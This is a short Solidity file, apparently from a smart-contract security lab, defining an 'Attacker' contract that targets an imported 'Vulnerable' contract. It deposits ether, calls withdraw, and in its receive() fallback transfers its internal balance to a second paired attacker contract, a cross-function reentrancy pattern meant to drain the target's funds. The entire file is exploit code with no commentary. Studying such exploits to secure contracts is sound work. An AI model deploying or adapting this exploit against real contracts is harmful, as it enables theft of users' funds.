// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Vulnerable} from "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vulnerable;
    Attacker public RobinHood;

    constructor(Vulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    function setRobinHood9(Attacker _RobinHood) external {
        RobinHood = _RobinHood;
    }

    function attackInit() external payable {
        require(msg.value >= 1 ether, "Initial attack deposit must be at least 1 ether!");
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    function attackNext() external {
        vulnerable.withdraw();
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.transferToInternally(address(RobinHood), vulnerable.userBalance(address(this)));
        }
    }
}
